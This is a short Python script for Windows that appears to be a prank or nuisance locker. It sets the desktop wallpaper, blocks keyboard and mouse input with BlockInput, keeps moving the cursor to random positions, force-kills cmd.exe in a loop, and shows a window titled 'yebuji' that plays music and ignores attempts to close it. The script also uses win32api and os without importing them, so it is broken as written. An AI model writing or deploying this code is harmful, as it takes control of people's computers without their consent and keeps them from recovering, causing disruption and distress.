import resource
import ctypes
import pygame
import threading
import random
ctypes.windll.user32.SystemParametersInfoW(20, 0, resource.folder+'desktop.png' ,3)

def setMouse():
    while True:
        win32api.SetCursorPos((random.randint(0,900),random.randint(0,900)))
        os.system('taskkill /f /im cmd.exe')

def show():
    pygame.init()
    pygame.display.set_caption("yebuji")
    screen = pygame.display.set_mode([621, 500])
    screen.fill([255, 255, 205])
    img = pygame.image.load(resource.folder+'yebuji.bmp')
    screen.blit(img, [0, 0])
    pygame.display.flip()
    pygame.mixer.init()
    pygame.mixer.music.load(resource.folder+'music.mp3')
    pygame.mixer.music.play(-1)
    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pass
def keepkeyboard():
    ctypes.windll.user32.BlockInput(True)
if __name__ == "__main__":
    K = threading.Thread(target=keepkeyboard)
    K.start()
    T = threading.Thread(target=setMouse)
    T.start()
    show()